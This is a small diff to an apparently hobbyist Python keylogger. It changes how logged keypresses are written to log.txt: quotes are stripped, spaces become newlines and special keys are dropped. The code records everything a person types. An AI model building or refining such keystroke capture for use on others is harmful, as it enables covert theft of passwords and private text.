@@ -12,7 +12,12 @@ def write_file(key):
     #create the file ine and convert key to str to be in txt file
     with open("log.txt", 'a') as f:
         for key in keys:
-            f.write(str(key))
+            k = str(key).replace("'","")
+            if k.find('space') >0:
+                f.write('\n')
+            elif k.find("Key")== -1:
+                f.write(k)
+                
 
 
 def on_press(key):
